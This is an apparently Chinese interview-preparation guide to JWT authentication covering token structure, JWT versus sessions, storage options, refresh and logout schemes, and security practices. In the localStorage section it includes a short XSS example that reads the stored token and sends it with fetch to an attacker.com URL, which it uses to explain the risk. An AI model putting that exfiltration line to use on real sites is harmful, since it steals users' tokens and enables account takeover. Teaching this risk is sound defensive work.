# JWT 认证

## ⭐ 面试重点速览

| 考点 | 考察频率 | 难度 | 掌握要求 |
|------|----------|------|----------|
| JWT 结构 | ⭐⭐⭐⭐⭐ | 简单 | Header/Payload/Signature 三段式必须掌握 |
| JWT vs Session 对比 | ⭐⭐⭐⭐⭐ | 简单 | 区分存储位置、扩展性、安全性 |
| Token 存储方案对比 | ⭐⭐⭐⭐⭐ | 中等 | Cookie httpOnly vs localStorage 要分清楚 |
| JWT 防篡改 | ⭐⭐⭐⭐ | 中等 | Signature 签名机制 |
| JWT 刷新机制 | ⭐⭐⭐ | 中等 | 过期处理和刷新策略 |

---

## 一、JWT 是什么？为什么需要 JWT？

### 什么是 JWT？

**JWT（JSON Web Token）** 是一种**基于 JSON 的开放标准**，用于在客户端和服务端之间传递声明（claims），实现无状态的身份认证。

```
一句话理解：用户登录后，服务端把用户信息用密钥签名加密，生成一串字符串返回给前端，前端每次请求都带着这个字符串，服务端验证签名就能知道是谁，不需要在服务端存储会话信息。
```

### 为什么需要 JWT？

传统的 Session 认证存在一些问题：

1. **服务器有状态**：Session 需要存在内存或数据库，集群部署时需要共享 Session，比较麻烦
2. **跨域问题**：Session 依赖 Cookie，跨域场景下 Cookie 传递麻烦
3. **移动端不友好**：App 原生开发处理 Cookie 不如直接在 Header 传 Token 方便
4. **微服务/分布式场景**：多个服务需要做会话同步，JWT 自带信息不需要共享

**JWT 的优势**：

- **完全无状态**：不需要服务器存储会话，所有信息都在 Token 里
- **天生分布式**：任何服务都可以验证 Token，不需要中心化会话存储
- **跨域友好**：可以放在 Authorization Header 中，不依赖 Cookie
- **移动端友好**：App 直接存储，不需要处理 Cookie
- **可自包含信息**：Token 本身可以携带用户 ID、角色等信息，不需要查数据库

---

## 二、JWT 结构（三段式详解）

JWT 的格式是三段式：`Header.Payload.Signature`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

└──────────────────────────┘ └─────────────────────────────────────────────┘ └──────────────────────────────────────────────┘
          Header                         Payload                                Signature
```

每一段都是 **Base64URL** 编码。

### 1. Header（头部）

Header 包含令牌类型和签名算法：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

| 字段 | 含义 |
|------|------|
| `alg` | 签名算法，常用 `HS256`（HMAC-SHA256）、`RS256`（RSA-SHA256） |
| `typ` | 令牌类型，固定 `JWT` |

然后把这个 JSON 用 Base64URL 编码，得到第一段。

### 2. Payload（载荷）

Payload 包含声明（Claims），就是我们要传递的数据：

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "role": "admin"
}
```

#### 声明类型

| 类型 | 说明 |
|------|------|
| **Reserved Claims**（预留声明） | JWT 规范定义的标准声明，可选但推荐使用 |
| **Public Claims**（公开声明） | 自定义公开信息，建议不冲突 |
| **Private Claims**（私有声明） | 自定义私有信息，由双方约定 |

#### 常用预留声明

| 保留声明 | 含义 | 示例 |
|----------|------|------|
| `iss` | 签发者（issuer） | `iss: "my-server.com"` |
| `sub` | 主题（subject），通常是用户 ID | `sub: "1001"` |
| `aud` | 受众（audience），接收方 | `aud: "my-app.com"` |
| `exp` | 过期时间（expiration），时间戳秒数 | `exp: 1688888888` |
| `nbf` | 生效时间（not before），在此之前不生效 | `nbf: 1688800000` |
| `iat` | 签发时间（issued at） | `iat: 1688800000` |
| `jti` | JWT ID，唯一标识符，用于去重 | `jti: "abc123"` |

然后把这个 JSON 也用 Base64URL 编码，得到第二段。

::: danger 重要警告
**Header 和 Payload 只是编码，不是加密！** 任何人都可以解码看到内容，所以**绝对不能把密码、密钥等敏感信息放在 Payload 里！**
:::

### 3. Signature（签名）

签名是用来验证完整性，防止被篡改：

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

- 公式：`签名 = 算法(Header.Base64 + . + Payload.Base64, 密钥)`
- 只有知道密钥的服务端才能生成签名
- 任何人都可以用公钥验证签名的正确性

### 解码示例

可以去 [jwt.io](https://jwt.io) 在线调试解码：

```javascript
// Node.js 解码示例
const jwt = require('jsonwebtoken');
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

// 解码（不验证签名）
const decoded = jwt.decode(token);
console.log(decoded);
// {
//   sub: "1234567890",
//   name: "John Doe",
//   iat: 1516239022
// }
```

### 算法对比：HS256 vs RS256

| 维度 | HS256（HMAC） | RS256（RSA） |
|------|---------------|--------------|
| 类型 | 对称加密 | 非对称加密 |
| 密钥 | 一个共享密钥（secret） | 私钥签名，公钥验证 |
| 适用场景 | 单服务，单体应用 | 微服务，多服务 |
| 安全性 | 需要保护好密钥 | 公钥可以公开，私钥保密 |
| 性能 | 快 | 慢 |

---

## 三、JWT 签发与验证流程

```mermaid
sequenceDiagram
    participant C as 客户端（浏览器）
    participant S as 服务端
    participant DB as 数据库

    C->>S: 发送用户名密码（登录）
    S->>DB: 查询用户信息验证
    DB-->>S: 返回用户信息
    S->>S: 构建 Header + Payload<br/>用密钥签名生成 JWT
    S-->>C: 返回 JWT（access_token）
    C->>C: 存储 JWT（Cookie / localStorage）

    Note over C,S: 后续请求
    C->>S: 请求接口：Authorization: Bearer <jwt>
    S->>S: 验证签名完整性<br/>检查过期时间<br/>解析 Payload 获取用户信息
    S-->>C: 返回响应数据
```

### 签发流程

1. 用户登录，用户名密码验证通过
2. 服务端准备 Header（算法声明）和 Payload（用户信息 + 过期时间等）
3. 对 Header 和 Payload 分别做 Base64URL 编码，用点拼接
4. 使用密钥对拼接结果做 HMAC-SHA256 运算，得到 Signature
5. 最终拼接：`Header.Payload.Signature` → 返回给客户端

### 验证流程

1. 收到请求，从 Authorization Header 中取出 Token
2. 拆分得到 Header、Payload、Signature 三段
3. 重新对 Header 和 Payload 计算签名（用同样的算法和密钥）
4. 比较收到的 Signature 和重新计算的签名是否一致
5. 如果不一致 → 无效 Token → 返回 401
6. 如果一致 → 检查 `exp` 过期时间 → 过期返回 401
7. 所有验证通过 → 读取 Payload 中的用户信息 → 处理请求

---

## 四、JWT vs Session 对比

| 对比维度 | JWT | Session + Cookie |
|----------|-----|------------------|
| **存储位置** | JWT 存储在客户端 | SessionID 存储在客户端 Cookie，数据在服务端 |
| **状态** | 无状态（服务端不存） | 有状态（服务端存储会话） |
| **扩展性** | 天生支持分布式，多服务直接用 | 需要 Session 共享（Redis）才支持分布式 |
| **服务器性能** | 服务端只需要验签，节省存储 | 需要内存/数据库存储，扩容麻烦 |
| **跨域支持** | 天然支持跨域（放在 Header） | Cookie 跨域默认不支持，需要配置 SameSite |
| **安全性** | XSS 可以窃取 localStorage 存储的 Token | Cookie httpOnly 能防 XSS 窃取 |
| **CSRF 防护** | 放在 Header 天然防 CSRF | Cookie 需要 CSRF Token 防护 |
| **移动端友好** | 友好（直接存了传 Header） | 不友好（处理 Cookie 麻烦） |
| **过期处理** | Token 自带过期时间 | Session 服务端控制过期 |
| **篡改防护** | 签名防篡改 | SessionID 随机，无法篡改 |

::: tip 适用场景选择

**推荐使用 JWT 的场景**：
- SPA + REST API 前后端分离项目
- 微服务架构，多个服务需要认证
- 移动端 App 开发
- 需要跨域访问的场景
- 第三方开放平台认证

**推荐使用 Session 的场景**：
- 传统服务端渲染项目
- 需要立即失效会话（如用户登出立刻需要生效）
- 对安全性要求极高的系统（银行、金融）
:::

---

## 五、Token 存储方案对比

JWT 返回给前端后，存在哪里？有几种常见方案：

| 方案 | 优点 | 缺点 | 推荐度 |
|------|------|------|--------|
| `localStorage` | 简单易用，不依赖 Cookie，跨域友好 | XSS 容易窃取，无法防 XSS | ❌ 不推荐 |
| `sessionStorage` | 关闭页面自动清除，比 localStorage 安全 | 刷新页面丢失，多标签页不共享 | ⭐⭐ 仅临时会话 |
| Cookie `httpOnly` + `Secure` + `SameSite` | 防 XSS 窃取，原生支持 | CSRF 需要防护，Cookie 大小限制 | ✅️ 推荐 |
| Cookie `httpOnly` + `Secure` + 前端内存存储 | Token 存在内存，刷新重登 | 刷新需要重新登录，体验差 | ⭐⭐⭐ 可选 |

### 详细分析

#### 方案 1：localStorage / sessionStorage

```javascript
// 存储
localStorage.setItem('token', jwtToken)

// 携带
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
})
```

**问题**：任何注入到页面的 XSS 脚本都可以读取：

```javascript
// XSS 攻击代码
const token = localStorage.getItem('token')
fetch('https://attacker.com/steal?token=' + token)
```

一旦 Token 被窃取，攻击者可以冒充用户身份操作。

::: danger 结论
只要你能被 XSS，存在 localStorage 的 Token 一定泄露。所以**不推荐**！
:::

---

#### 方案 2：Cookie + httpOnly

```http
Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

| 属性 | 作用 |
|------|------|
| `HttpOnly` | 禁止 JavaScript 读取 Cookie，XSS 无法窃取 |
| `Secure` | 只在 HTTPS 下传输，防止中间人窃听 |
| `SameSite=Lax/Strict` | 防止 CSRF 攻击 |
| `Path=/` | 全站可用 |
| `Max-Age` | 过期时间 |

**优点**：
- XSS 无法读取 Cookie（因为 `HttpOnly`），比 localStorage 安全很多
- 浏览器自动携带，前端不需要手动处理
- 自动过期，不需要前端处理

**缺点**：
- 需要 CSRF 防护（因为浏览器自动携带 Cookie）
- 跨域场景需要配置正确的 `SameSite` 和 CORS
- Cookie 有 4KB 大小限制（但 JWT 一般不会超）

::: tip 实际开发推荐
对于 Web 应用，**Cookie + httpOnly + Secure + SameSite** 是目前最安全的方案。配合 CSRF Token 可以同时防 XSS 和 CSRF。
:::

---

#### 方案 3：前端内存存储 + 刷新重登

```javascript
// React 示例
let accessToken = null  // 存在内存，刷新就没了

function login(username, password) {
  return fetch('/api/login', ...)
    .then(res => res.json())
    .then(data => {
      accessToken = data.accessToken  // 只存在内存
      return data
    })
}

function apiRequest() {
  return fetch('/api/data', {
    headers: { Authorization: `Bearer ${accessToken}` }
  })
}
```

**优点**：
- XSS 很难读取内存中的变量（相对安全）
- 不依赖 Cookie

**缺点**：
- 刷新页面丢失，需要重新登录，用户体验差
- 如果用 `useState` 存储，路由跳转也可能丢失
- 多标签页不同步，体验差

### 总结存储方案

| 攻击类型 | localStorage | Cookie httpOnly | 内存存储 |
|----------|---------------|-----------------|----------|
| XSS 窃取 | ❌ 容易被偷 | ✅ 防 XSS 窃取 | ✅ 较难 |
| CSRF 攻击 | ✅ 天然防御 | ❌ 需要防护 | ✅ 天然防御 |
| 体验 | ✅ 刷新不丢 | ✅ 刷新不丢 | ❌ 刷新丢失 |

**推荐结论**：
- 传统 Web：Cookie httpOnly + CSRF Token → 最安全
- SPA 前后端分离：可以用 Cookie httpOnly 或者内存 + 刷新令牌机制
- 绝对不要只存在 localStorage 就完事了！

---

## 六、常见面试题

### Q1: JWT 如何防止被篡改？

**A**：JWT 通过**签名**来防止篡改。

原理：
1. JWT 的第三部分 `Signature` 是用 Header + Payload 和密钥一起计算出来的摘要
2. 如果有人修改了 Header 或 Payload，那么重新计算出来的签名就会不一样
3. 服务端收到 JWT 后，重新计算签名对比，如果不一致就说明被篡改了，直接拒绝

```
原始：
Header = {alg: HS256} → base64: abc
Payload = {sub: 123, exp: ...} → base64: def
签名 = HS256("abc.def", secret) → 123xyz
完整：abc.def.123xyz

攻击者修改：
Payload = {sub: 456, exp: ...} → base64: xyz
但攻击者不知道 secret，无法计算出正确的签名
如果冒充签名还是 123xyz，服务端重新计算得到 abc.xyz → 新签名 != 123xyz → 验证失败
```

::: tip 注意
签名只保证完整性（不被篡改），不保证加密。Header 和 Payload 只是编码，还是可以看到内容，所以敏感信息不要放进去。
:::

---

### Q2: JWT 过期后如何刷新？有哪些方案？

**A**：常见的刷新方案有几种：

#### 方案 1：双 Token 机制（推荐）

```
access_token：
  - 短过期（15分钟 ~ 2小时）
  - 用来访问接口，每次请求验证

refresh_token：
  - 长过期（7天 ~ 30天）
  - 只用来刷新 access_token，不用于业务接口
```

工作流程：

```mermaid
sequenceDiagram
    participant C as 客户端
    participant S as 服务端
    C->>S: 登录 → 返回 access_token + refresh_token
    C->>S: 业务请求带 access_token
    alt access_token 未过期
        S-->>C: 正常返回数据
    else access_token 过期
        S-->>C: 返回 401
        C->>S: 用 refresh_token 请求刷新
        S-->>C: 返回新的 access_token + 新的 refresh_token
        C->>S: 用新 access_token 重试请求
    end
```

**优点**：
- access_token 短过期，即使泄露也很快失效，安全性高
- refresh_token 长过期，用户不用频繁登录
- 服务端可以拉黑 refresh_token 提前失效

**缺点**：
- 需要存储 refresh_token（Redis），变成有状态了？其实也可以让 refresh_token 也签名过期，服务端不存
- 需要前端处理 401 自动刷新逻辑

---

#### 方案 2：每次刷新页面重新获取

- access_token 存在内存，刷新页面自动跳转到登录页让用户重新登录
- 适合安全性要求极高但用户量不大的内部系统

---

#### 方案 3：滑动过期（服务端存储）

- 每次请求刷新过期时间
- 需要服务端存储 Token 的过期时间，失去无状态优势
- 适合需要保持在线的场景

---

#### 方案 4：不刷新，永不过期

**绝对不推荐！** 一旦 Token 泄露，永远有效，非常危险。

::: tip 最佳实践
双 Token 机制是目前业界主流方案：`access_token` 短过期保证安全，`refresh_token` 长过期保证体验。
:::

---

### Q3: Token 存 Cookie 还是 localStorage？哪个更安全？

**A**：从安全性角度：**Cookie httpOnly 比 localStorage 更安全**。

原因对比：

1. **XSS 防护**：
   - `localStorage`：JavaScript 可以直接读取，只要页面有 XSS 漏洞，Token 立刻被偷
   - `Cookie httpOnly`：JavaScript 无法读取，XSS 偷不到 Token

2. **CSRF 防护**：
   - `localStorage`：Token 放在 Header，浏览器不会自动携带，天然防 CSRF
   - `Cookie httpOnly`：浏览器自动携带，需要 CSRF 防护（加 CSRF Token）

3. **结论**：
   - XSS 的危害比 CSRF 更大，XSS 可以做任何事情，所以防止 XSS 窃取更重要
   - CSRF 可以通过 SameSite Cookie 和 CSRF Token 防护
   - 所以总体来说 **Cookie httpOnly 更安全**

::: warning 常见误区
很多人说 "localStorage 比 Cookie 安全因为防 CSRF"，这是错的！

XSS 偷了 Token 直接就能用，危害比 CSRF 大得多。Cookie httpOnly 防 XSS 窃取才是更安全的选择。
:::

---

### Q4: JWT 可以注销吗？

**A**：纯 JWT 是无状态的，默认不能注销，因为所有信息都在 Token 里，服务端不存。

要实现注销有几种方案：

1. **黑名单机制**：把注销的 Token JTI 存在 Redis，设置过期时间，每次请求都检查黑名单
   - 优点：可以立即注销
   - 缺点：需要存储，变成有状态了，但只有黑名单，存储量不大

2. **缩短过期时间**：access_token 设置短过期（比如 15 分钟），就算不注销，很快也过期了

3. **更换密钥**：所有 Token 都失效，相当于全站用户重新登录，一般不用

4. **refresh_token 机制**：refresh_token 存在服务端（Redis），注销就是删除 refresh_token，access_token 等它自己过期

**面试回答**：
> "纯 JWT 本身不支持立即注销，因为服务端不存储。实际开发中，如果需要注销功能，可以用黑名单机制，把注销的 Token JTI 存在 Redis 中，每次请求验证的时候检查一下。或者使用双 Token，access_token 短过期，refresh_token 存在服务端，注销就是删除 refresh_token。"

---

### Q5: JWT 的缺点是什么？

**A**：JWT 有这些缺点：

1. **不能立即失效**：纯 JWT 不存服务端，只能等过期，要立即失效需要额外存储
2. **Payload 体积大**：比 SessionID 大很多，每次请求都带着会增加带宽开销
3. **不安全的使用方式**：很多人存在 localStorage，容易被 XSS 窃取
4. **需要签名验证**：每次请求都要验签，有计算开销（但其实很小）
5. **不适合做会话存储**：如果要频繁更新会话信息，JWT 不如 Session 灵活

---

### Q6: JWT 和 OAuth 是什么关系？

**A**：JWT 是一种**令牌格式**，OAuth 是一种**授权框架**，两者不是一个层面的东西。

- OAuth 2.0 可以用 JWT 作为 Access Token 的格式
- JWT 也可以不配合 OAuth，直接用于自己项目的认证
- 简单说：OAuth 是大框架，JWT 可以用作 OAuth 里的 Token 格式

---

## 七、安全最佳实践

1. **永远使用 HTTPS**：没有 HTTPS，任何认证机制都不安全
2. **短过期 access_token + 长过期 refresh_token**：双 Token 机制平衡安全和体验
3. **敏感操作要求重新登录**：改密码、删账号等重要操作要求用户重新验证
4. **不要在 Payload 放敏感信息**：Header 和 Payload 只是 Base64 编码，不是加密，任何人都能解码
5. 使用 **Cookie httpOnly + Secure + SameSite=Lax** 存储 Token，比 localStorage 安全
6. 需要 CSRF 防护：CSRF Token 或者 SameSite Cookie
7. 使用强密钥：HS256 的密钥要足够长（至少 32 字符随机）
8. 验证所有标准声明：`exp`、`nbf`、`iss`、`aud` 都要验证，不要只验签名
9. 不要用 JWT 做 Session 存储，它是**令牌**，不是数据库
10. 如果是多服务架构，推荐用 RS256 非对称加密，服务端只用公钥验证，不需要持有签名密钥

---

## 总结

JWT 是目前前后端分离项目中最流行的无状态认证方案：

- **结构**：`Header.Payload.Signature` 三段式，签名防篡改
- **优势**：无状态、分布式友好、跨域友好、移动端友好
- **存储**：推荐 Cookie httpOnly，不推荐 localStorage 直接存
- **刷新**：推荐双 Token（access + refresh）机制
- **安全**：HTTPS 是基础，短过期 + 签名验证保证安全

面试中要能说清 JWT 结构、JWT vs Session 对比、存储方案对比，以及常见问题（防篡改、刷新、注销）的解决方案。
